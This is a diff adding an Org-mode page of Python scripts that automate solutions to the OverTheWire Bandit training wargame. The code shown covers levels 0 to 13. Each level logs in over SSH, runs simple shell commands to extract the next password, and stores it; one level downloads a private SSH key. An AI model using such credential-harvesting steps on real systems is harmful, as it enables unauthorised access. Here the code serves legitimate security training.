@@ -1,0 +1,1064 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2021-04-24 Sat 18:53 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>OverTheWire Bandit</title>
+<meta name="author" content="CavemanJay" />
+<meta name="generator" content="Org Mode" />
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: auto;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline; margin-top: 14px;}
+  /* Languages per Org manual */
+  pre.src-asymptote:before { content: 'Asymptote'; }
+  pre.src-awk:before { content: 'Awk'; }
+  pre.src-C:before { content: 'C'; }
+  /* pre.src-C++ doesn't work in CSS */
+  pre.src-clojure:before { content: 'Clojure'; }
+  pre.src-css:before { content: 'CSS'; }
+  pre.src-D:before { content: 'D'; }
+  pre.src-ditaa:before { content: 'ditaa'; }
+  pre.src-dot:before { content: 'Graphviz'; }
+  pre.src-calc:before { content: 'Emacs Calc'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-fortran:before { content: 'Fortran'; }
+  pre.src-gnuplot:before { content: 'gnuplot'; }
+  pre.src-haskell:before { content: 'Haskell'; }
+  pre.src-hledger:before { content: 'hledger'; }
+  pre.src-java:before { content: 'Java'; }
+  pre.src-js:before { content: 'Javascript'; }
+  pre.src-latex:before { content: 'LaTeX'; }
+  pre.src-ledger:before { content: 'Ledger'; }
+  pre.src-lisp:before { content: 'Lisp'; }
+  pre.src-lilypond:before { content: 'Lilypond'; }
+  pre.src-lua:before { content: 'Lua'; }
+  pre.src-matlab:before { content: 'MATLAB'; }
+  pre.src-mscgen:before { content: 'Mscgen'; }
+  pre.src-ocaml:before { content: 'Objective Caml'; }
+  pre.src-octave:before { content: 'Octave'; }
+  pre.src-org:before { content: 'Org mode'; }
+  pre.src-oz:before { content: 'OZ'; }
+  pre.src-plantuml:before { content: 'Plantuml'; }
+  pre.src-processing:before { content: 'Processing.js'; }
+  pre.src-python:before { content: 'Python'; }
+  pre.src-R:before { content: 'R'; }
+  pre.src-ruby:before { content: 'Ruby'; }
+  pre.src-sass:before { content: 'Sass'; }
+  pre.src-scheme:before { content: 'Scheme'; }
+  pre.src-screen:before { content: 'Gnu Screen'; }
+  pre.src-sed:before { content: 'Sed'; }
+  pre.src-sh:before { content: 'shell'; }
+  pre.src-sql:before { content: 'SQL'; }
+  pre.src-sqlite:before { content: 'SQLite'; }
+  /* additional languages in org.el's org-babel-load-languages alist */
+  pre.src-forth:before { content: 'Forth'; }
+  pre.src-io:before { content: 'IO'; }
+  pre.src-J:before { content: 'J'; }
+  pre.src-makefile:before { content: 'Makefile'; }
+  pre.src-maxima:before { content: 'Maxima'; }
+  pre.src-perl:before { content: 'Perl'; }
+  pre.src-picolisp:before { content: 'Pico Lisp'; }
+  pre.src-scala:before { content: 'Scala'; }
+  pre.src-shell:before { content: 'Shell Script'; }
+  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
+  /* additional language identifiers per "defun org-babel-execute"
+       in ob-*.el */
+  pre.src-cpp:before  { content: 'C++'; }
+  pre.src-abc:before  { content: 'ABC'; }
+  pre.src-coq:before  { content: 'Coq'; }
+  pre.src-groovy:before  { content: 'Groovy'; }
+  /* additional language identifiers from org-babel-shell-names in
+     ob-shell.el: ob-shell is the only babel language using a lambda to put
+     the execution function name together. */
+  pre.src-bash:before  { content: 'bash'; }
+  pre.src-csh:before  { content: 'csh'; }
+  pre.src-ash:before  { content: 'ash'; }
+  pre.src-dash:before  { content: 'dash'; }
+  pre.src-ksh:before  { content: 'ksh'; }
+  pre.src-mksh:before  { content: 'mksh'; }
+  pre.src-posh:before  { content: 'posh'; }
+  /* Additional Emacs modes also supported by the LaTeX listings package */
+  pre.src-ada:before { content: 'Ada'; }
+  pre.src-asm:before { content: 'Assembler'; }
+  pre.src-caml:before { content: 'Caml'; }
+  pre.src-delphi:before { content: 'Delphi'; }
+  pre.src-html:before { content: 'HTML'; }
+  pre.src-idl:before { content: 'IDL'; }
+  pre.src-mercury:before { content: 'Mercury'; }
+  pre.src-metapost:before { content: 'MetaPost'; }
+  pre.src-modula-2:before { content: 'Modula-2'; }
+  pre.src-pascal:before { content: 'Pascal'; }
+  pre.src-ps:before { content: 'PostScript'; }
+  pre.src-prolog:before { content: 'Prolog'; }
+  pre.src-simula:before { content: 'Simula'; }
+  pre.src-tcl:before { content: 'tcl'; }
+  pre.src-tex:before { content: 'TeX'; }
+  pre.src-plain-tex:before { content: 'Plain TeX'; }
+  pre.src-verilog:before { content: 'Verilog'; }
+  pre.src-vhdl:before { content: 'VHDL'; }
+  pre.src-xml:before { content: 'XML'; }
+  pre.src-nxml:before { content: 'XML'; }
+  /* add a generic configuration mode; LaTeX export needs an additional
+     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
+  pre.src-conf:before { content: 'Configuration File'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .equation-container {
+    display: table;
+    text-align: center;
+    width: 100%;
+  }
+  .equation {
+    vertical-align: middle;
+  }
+  .equation-label {
+    display: table-cell;
+    text-align: right;
+    vertical-align: middle;
+  }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  .org-svg { width: 90%; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="https://fniessen.github.io/org-html-themes/src/readtheorg_theme/css/htmlize.css"/>
+<link rel="stylesheet" type="text/css" href="https://fniessen.github.io/org-html-themes/src/readtheorg_theme/css/readtheorg.css"/>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
+<script type="text/javascript" src="https://fniessen.github.io/org-html-themes/src/lib/js/jquery.stickytableheaders.min.js"></script>
+<script type="text/javascript" src="https://fniessen.github.io/org-html-themes/src/readtheorg_theme/js/readtheorg.js"></script>
+<script type="text/javascript">
+// @license magnet:?xt=urn:btih:e95b018ef3580986a04669f1b5879592219e2a7a&dn=public-domain.txt Public Domain
+<!--/*--><![CDATA[/*><!--*/
+     function CodeHighlightOn(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(null != target) {
+         elem.classList.add("code-highlighted");
+         target.classList.add("code-highlighted");
+       }
+     }
+     function CodeHighlightOff(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(null != target) {
+         elem.classList.remove("code-highlighted");
+         target.classList.remove("code-highlighted");
+       }
+     }
+    /*]]>*///-->
+// @license-end
+</script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">OverTheWire Bandit</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#orgbe3c82d">About</a></li>
+<li><a href="#org511fa45">Setup</a></li>
+<li><a href="#org29028ed">Bandit0 =&gt; Bandit1</a></li>
+<li><a href="#org748df79">Bandit1 =&gt; Bandit2</a></li>
+<li><a href="#org0c9bb53">Bandit2 =&gt; Bandit3</a></li>
+<li><a href="#org08c9da4">Bandit3 =&gt; Bandit4</a></li>
+<li><a href="#orge554103">Bandit4 =&gt; Bandit5</a></li>
+<li><a href="#org48663bc">Bandit5 =&gt; Bandit6</a></li>
+<li><a href="#org3441f86">Bandit6 =&gt; Bandit7</a></li>
+<li><a href="#org4c527af">Bandit7 =&gt; Bandit8</a></li>
+<li><a href="#org0967247">Bandit8 =&gt; Bandit9</a></li>
+<li><a href="#org2ded7d2">Bandit9 =&gt; Bandit10</a></li>
+<li><a href="#orgbfadd1f">Bandit10 =&gt; Bandit11</a></li>
+<li><a href="#orgef5b328">Bandit11 =&gt; Bandit12</a></li>
+<li><a href="#orgaf6ba48">Bandit12 =&gt; Bandit13</a></li>
+<li><a href="#org78ada85">Bandit13 =&gt; Bandit14</a></li>
+<li><a href="#orgd5e64e2">Bandit14 =&gt; Bandit15</a></li>
+<li><a href="#orgb67d0ed">Bandit15 =&gt; Bandit16</a></li>
+<li><a href="#org5284704">Bandit16 =&gt; Bandit17</a></li>
+<li><a href="#orge752a0e">Bandit17 =&gt; Bandit18</a></li>
+<li><a href="#orgd2f6d95">Bandit18 =&gt; Bandit19</a></li>
+<li><a href="#org3d1f585">Bandit19 =&gt; Bandit20</a></li>
+<li><a href="#org1e1692d">Bandit20 =&gt; Bandit21</a></li>
+<li><a href="#orgee83274">Bandit21 =&gt; Bandit22</a></li>
+<li><a href="#org751074e">Bandit22 =&gt; Bandit23</a></li>
+<li><a href="#org40ceacb">Bandit23 =&gt; Bandit24</a></li>
+<li><a href="#orgcc44857">Bandit24 =&gt; Bandit25</a></li>
+<li><a href="#orgbced051">Bandit25 =&gt; Bandit26</a></li>
+<li><a href="#org2e7c208">Bandit26 =&gt; Bandit27</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgbe3c82d" class="outline-2">
+<h2 id="orgbe3c82d">About</h2>
+<div class="outline-text-2" id="text-orgbe3c82d">
+<p>
+This script contains my efforts to script the solutions to the bandit challenges on <a href="https://overthewire.org">OverTheWire</a>. This makes heavy use of the paramiko module to run ssh commands
+</p>
+</div>
+</div>
+<div id="outline-container-org511fa45" class="outline-2">
+<h2 id="org511fa45">Setup</h2>
+<div class="outline-text-2" id="text-org511fa45">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">import</span> paramiko
+<span style="color: #51afef;">import</span> json
+<span style="color: #51afef;">import</span> sys
+<span style="color: #51afef;">import</span> os
+<span style="color: #51afef;">import</span> shutil
+<span style="color: #51afef;">import</span> gzip
+<span style="color: #51afef;">import</span> subprocess
+<span style="color: #51afef;">import</span> utils
+<span style="color: #51afef;">import</span> re
+<span style="color: #51afef;">import</span> base64
+<span style="color: #51afef;">import</span> time
+<span style="color: #51afef;">import</span> itertools
+
+<span style="color: #dcaeea;">host</span> = <span style="color: #98be65;">"bandit.labs.overthewire.org"</span>
+<span style="color: #dcaeea;">ssh_port</span> = <span style="color: #da8548; font-weight: bold;">2220</span>
+<span style="color: #dcaeea;">credentials</span> = {<span style="color: #98be65;">"bandit0"</span>: <span style="color: #98be65;">"bandit0"</span>}
+
+<span style="color: #51afef;">def</span> <span style="color: #c678dd;">save</span>():
+    <span style="color: #51afef;">with</span> <span style="color: #c678dd;">open</span>(<span style="color: #98be65;">'bandit.progress'</span>,<span style="color: #98be65;">'w'</span>) <span style="color: #51afef;">as</span> f:
+        json.dump(credentials, f)
+
+<span style="color: #51afef;">def</span> <span style="color: #c678dd;">load</span>():
+    <span style="color: #51afef;">global</span> credentials
+    <span style="color: #51afef;">with</span> <span style="color: #c678dd;">open</span>(<span style="color: #98be65;">'bandit.progress'</span>,<span style="color: #98be65;">'r'</span>) <span style="color: #51afef;">as</span> f:
+        <span style="color: #dcaeea;">credentials</span> = json.load(f)
+
+<span style="color: #51afef;">try</span>:
+    load()
+<span style="color: #51afef;">except</span>:
+    <span style="color: #51afef;">pass</span>
+
+<span style="color: #51afef;">try</span>:
+    os.mkdir(<span style="color: #98be65;">'working'</span>)
+<span style="color: #51afef;">except</span>:
+    <span style="color: #51afef;">pass</span>
+
+<span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Initializing ssh client"</span>)
+<span style="color: #dcaeea;">ssh</span> = paramiko.SSHClient()
+ssh.load_system_host_keys()
+
+<span style="color: #51afef;">def</span> <span style="color: #c678dd;">connect</span>(username: <span style="color: #c678dd;">str</span>):
+    <span style="color: #dcaeea;">creds</span> = credentials[username]
+    <span style="color: #51afef;">if</span> <span style="color: #c678dd;">isinstance</span>(creds, <span style="color: #c678dd;">str</span>):
+        ssh.connect(host, ssh_port, username=username, password=creds)
+    <span style="color: #51afef;">else</span>:
+        <span style="color: #51afef;">if</span> os.path.exists(creds[<span style="color: #da8548; font-weight: bold;">0</span>]):
+            ssh.connect(host, ssh_port, username=username, key_filename = creds[<span style="color: #da8548; font-weight: bold;">0</span>])
+        <span style="color: #51afef;">else</span>:
+            ssh.connect(host, ssh_port, username=username, password=creds[<span style="color: #da8548; font-weight: bold;">1</span>])
+
+<span style="color: #51afef;">def</span> <span style="color: #c678dd;">make_work_dir</span>():
+    <span style="color: #dcaeea;">path</span> = <span style="color: #98be65;">'/tmp/jaydlc'</span>
+    ssh.exec_command(F<span style="color: #98be65;">'mkdir {path} &amp;&amp; chmod 777 {path}'</span>)
+    <span style="color: #51afef;">return</span> path
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org29028ed" class="outline-2">
+<h2 id="org29028ed">Bandit0 =&gt; Bandit1</h2>
+<div class="outline-text-2" id="text-org29028ed">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit0</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit0"</span>)
+    connect(<span style="color: #98be65;">'bandit0'</span>)
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat readme'</span>)
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit1"</span>] = out.read().decode().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org748df79" class="outline-2">
+<h2 id="org748df79">Bandit1 =&gt; Bandit2</h2>
+<div class="outline-text-2" id="text-org748df79">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit1</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit1"</span>)
+    connect(<span style="color: #98be65;">'bandit1'</span>)
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat ./-'</span>)
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit2"</span>] = out.readline().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org0c9bb53" class="outline-2">
+<h2 id="org0c9bb53">Bandit2 =&gt; Bandit3</h2>
+<div class="outline-text-2" id="text-org0c9bb53">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit2</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit2"</span>)
+    connect(<span style="color: #98be65;">'bandit2'</span>)
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat "spaces in this filename"'</span>)
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit3"</span>] = out.readline().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org08c9da4" class="outline-2">
+<h2 id="org08c9da4">Bandit3 =&gt; Bandit4</h2>
+<div class="outline-text-2" id="text-org08c9da4">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit3</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit3"</span>)
+    connect(<span style="color: #98be65;">'bandit3'</span>)
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat ./inhere/.hidden'</span>)
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit4"</span>] = out.read().decode().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orge554103" class="outline-2">
+<h2 id="orge554103">Bandit4 =&gt; Bandit5</h2>
+<div class="outline-text-2" id="text-orge554103">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit4</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit4"</span>)
+    connect(<span style="color: #98be65;">'bandit4'</span>)
+
+    <span style="color: #5B6268;"># </span><span style="color: #5B6268;">Find only human readable file in the 'inhere' directory</span>
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'file ./inhere/*'</span>)
+    <span style="color: #c678dd;">file</span> = [f <span style="color: #51afef;">for</span> f <span style="color: #51afef;">in</span> out.read().decode().split(<span style="color: #98be65;">'\n'</span>) <span style="color: #51afef;">if</span> <span style="color: #98be65;">'ASCII'</span> <span style="color: #51afef;">in</span> f][<span style="color: #da8548; font-weight: bold;">0</span>].split(<span style="color: #98be65;">":"</span>)[<span style="color: #da8548; font-weight: bold;">0</span>]
+
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(F<span style="color: #98be65;">'cat {file}'</span>)
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit5"</span>] = out.read().decode().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org48663bc" class="outline-2">
+<h2 id="org48663bc">Bandit5 =&gt; Bandit6</h2>
+<div class="outline-text-2" id="text-org48663bc">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit5</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit5"</span>)
+    connect(<span style="color: #98be65;">'bandit5'</span>)
+
+    <span style="color: #5B6268;"># </span><span style="color: #5B6268;">Find the file with the specified properties and read it</span>
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(r<span style="color: #98be65;">'find ./inhere/ -size 1033c \! -executable -exec cat {} \;'</span>)
+
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit6"</span>] = out.read().decode().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org3441f86" class="outline-2">
+<h2 id="org3441f86">Bandit6 =&gt; Bandit7</h2>
+<div class="outline-text-2" id="text-org3441f86">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit6</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit6"</span>)
+    connect(<span style="color: #98be65;">'bandit6'</span>)
+
+    <span style="color: #5B6268;"># </span><span style="color: #5B6268;">Find the file with the specified properties and read it</span>
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(r<span style="color: #98be65;">'find / -user bandit7 -group bandit6 -size 33c -exec cat {} \;'</span>)
+
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit7"</span>] = out.read().decode().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org4c527af" class="outline-2">
+<h2 id="org4c527af">Bandit7 =&gt; Bandit8</h2>
+<div class="outline-text-2" id="text-org4c527af">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit7</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit7"</span>)
+    connect(<span style="color: #98be65;">'bandit7'</span>)
+
+    <span style="color: #5B6268;"># </span><span style="color: #5B6268;">Find the file with the specified properties and read it</span>
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(r<span style="color: #98be65;">'grep millionth data.txt | xargs | cut -d " " -f2'</span>)
+
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit8"</span>] = out.read().decode().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org0967247" class="outline-2">
+<h2 id="org0967247">Bandit8 =&gt; Bandit9</h2>
+<div class="outline-text-2" id="text-org0967247">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit8</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit8"</span>)
+    connect(<span style="color: #98be65;">'bandit8'</span>)
+
+    <span style="color: #5B6268;"># </span><span style="color: #5B6268;">Find the file with the specified properties and read it</span>
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'sort data.txt | uniq -u'</span>)
+
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit9"</span>] = out.read().decode().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org2ded7d2" class="outline-2">
+<h2 id="org2ded7d2">Bandit9 =&gt; Bandit10</h2>
+<div class="outline-text-2" id="text-org2ded7d2">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit9</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit9"</span>)
+    connect(<span style="color: #98be65;">'bandit9'</span>)
+
+    <span style="color: #5B6268;"># </span><span style="color: #5B6268;">Find the file with the specified properties and read it</span>
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(r<span style="color: #98be65;">'strings data.txt | grep -oE "= \w*" | tail -n 1 | cut -d " " -f2'</span>)
+
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit10"</span>] = out.read().decode().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgbfadd1f" class="outline-2">
+<h2 id="orgbfadd1f">Bandit10 =&gt; Bandit11</h2>
+<div class="outline-text-2" id="text-orgbfadd1f">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit10</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit10"</span>)
+    connect(<span style="color: #98be65;">'bandit10'</span>)
+
+    <span style="color: #5B6268;"># </span><span style="color: #5B6268;">Find the file with the specified properties and read it</span>
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat data.txt | base64 -d | cut -d " " -f4'</span>)
+
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit11"</span>] = out.read().decode().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgef5b328" class="outline-2">
+<h2 id="orgef5b328">Bandit11 =&gt; Bandit12</h2>
+<div class="outline-text-2" id="text-orgef5b328">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit11</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit11"</span>)
+    connect(<span style="color: #98be65;">'bandit11'</span>)
+
+    <span style="color: #5B6268;"># </span><span style="color: #5B6268;">Find the file with the specified properties and read it</span>
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">err</span> = ssh.exec_command(<span style="color: #98be65;">'cat data.txt | tr "A-Za-z" "N-ZA-Mn-za-m" | cut -d " " -f4'</span>)
+
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit12"</span>] = out.read().decode().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgaf6ba48" class="outline-2">
+<h2 id="orgaf6ba48">Bandit12 =&gt; Bandit13</h2>
+<div class="outline-text-2" id="text-orgaf6ba48">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit12</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit12"</span>)
+    connect(<span style="color: #98be65;">'bandit12'</span>)
+
+    <span style="color: #dcaeea;">root</span> = os.getcwd()
+    <span style="color: #dcaeea;">cwd</span> = <span style="color: #98be65;">'working/bandit12'</span>
+    <span style="color: #51afef;">try</span>:
+        shutil.rmtree(cwd)
+    <span style="color: #51afef;">except</span>:
+        <span style="color: #51afef;">pass</span>
+
+    os.mkdir(cwd)
+    os.chdir(cwd)
+
+    <span style="color: #dcaeea;">sftp</span> = ssh.open_sftp()
+    sftp.get(<span style="color: #98be65;">'./data.txt'</span>, <span style="color: #98be65;">'./data.txt'</span>)
+    sftp.close()
+
+    os.popen(<span style="color: #98be65;">'cat data.txt | xxd -r &gt; data2.gz'</span>).read()
+    utils.gzip_decompress(<span style="color: #98be65;">'data2.gz'</span>, <span style="color: #98be65;">'data3.bz2'</span>)
+    utils.bzip2_decompress(<span style="color: #98be65;">'data3.bz2'</span>, <span style="color: #98be65;">'data4.gz'</span>)
+    utils.gzip_decompress(<span style="color: #98be65;">'data4.gz'</span>, <span style="color: #98be65;">'data5.tar'</span>)
+    utils.tar_decompress(<span style="color: #98be65;">'data5.tar'</span>, <span style="color: #98be65;">'data6'</span>)
+    utils.tar_decompress(<span style="color: #98be65;">'data6/data5.bin'</span>, <span style="color: #98be65;">'data7'</span>)
+    utils.bzip2_decompress(<span style="color: #98be65;">'data7/data6.bin'</span>, <span style="color: #98be65;">'data8.tar'</span>)
+    utils.tar_decompress(<span style="color: #98be65;">'data8.tar'</span>, <span style="color: #98be65;">'data9'</span>)
+    utils.gzip_decompress(<span style="color: #98be65;">'data9/data8.bin'</span>, <span style="color: #98be65;">'data10'</span>)
+
+    <span style="color: #51afef;">with</span> <span style="color: #c678dd;">open</span>(<span style="color: #98be65;">'data10'</span>, <span style="color: #98be65;">'r'</span>) <span style="color: #51afef;">as</span> f:
+        <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit13"</span>] = f.read().split(<span style="color: #98be65;">' '</span>)[-<span style="color: #da8548; font-weight: bold;">1</span>].strip()
+
+    os.chdir(root)
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org78ada85" class="outline-2">
+<h2 id="org78ada85">Bandit13 =&gt; Bandit14</h2>
+<div class="outline-text-2" id="text-org78ada85">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit13</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit13"</span>)
+    connect(<span style="color: #98be65;">'bandit13'</span>)
+
+    <span style="color: #dcaeea;">root</span> = os.getcwd()
+    <span style="color: #dcaeea;">cwd</span> = <span style="color: #98be65;">'working/bandit13'</span>
+    <span style="color: #51afef;">try</span>:
+        shutil.rmtree(cwd)
+    <span style="color: #51afef;">except</span>:
+        <span style="color: #51afef;">pass</span>
+
+    os.mkdir(cwd)
+    os.chdir(cwd)
+
+    <span style="color: #dcaeea;">sftp</span> = ssh.open_sftp()
+    sftp.get(<span style="color: #98be65;">'./sshkey.private'</span>, <span style="color: #98be65;">'./bandit14_id_rsa'</span>)
+    sftp.close()
+
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit14"</span>] = [os.getcwd() + <span style="color: #98be65;">'/bandit14_id_rsa'</span>]
+
+    os.chdir(root)
+    save()
